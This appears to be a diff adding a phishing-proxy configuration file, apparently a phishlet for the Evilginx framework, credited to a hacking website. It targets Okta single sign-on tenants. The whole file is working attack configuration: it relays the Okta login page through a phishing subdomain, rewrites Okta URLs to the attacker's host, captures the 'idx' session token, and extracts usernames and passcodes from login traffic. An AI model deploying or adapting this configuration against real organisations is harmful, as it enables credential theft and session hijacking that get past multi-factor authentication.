@@ -1,0 +1,43 @@
+# Advanced Configuration for Okta Tenant Interception
+# Author: www.simplerhacking.com
+# Minimum Version Required: 3.0.0
+name: 'Okta'
+author: 'www.simplerhacking.com'
+min_ver: '3.0.0'
+
+# Paste your actual Okta.com tenant in the <> parameter
+proxy_hosts:
+  - phish_sub: '<okta-tenant-placeholder>'
+    orig_sub: '<okta-tenant-placeholder>'
+    domain: 'okta.com'
+    session: true
+    is_landing: true
+    auto_filter: true
+sub_filters:
+  - triggers_on: '<okta-tenant-placeholder>'
+    orig_sub: ''
+    domain: '<okta-tenant-placeholder>'
+    search: '<okta-tenant-placeholder>.okta.com'
+    replace: '{hostname}'
+    mimes: ['application/ion+json']
+  - triggers_on: '<okta-tenant-placeholder>'
+    orig_sub: ''
+    domain: '<okta-tenant-placeholder>'
+    search: 'https.*\.okta\.com'
+    replace: 'https://{hostname}'
+    mimes: ['text/html']
+auth_tokens:
+  - domain: '<okta-tenant-placeholder>'
+    keys: ['idx']
+credentials:
+  username:
+    key: ''
+    search: '"identifier":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"passcode":"([^"]*)'
+    type: 'json'
+login:
+  domain: '<okta-tenant-placeholder>'
+  path: '/login/login.htm'
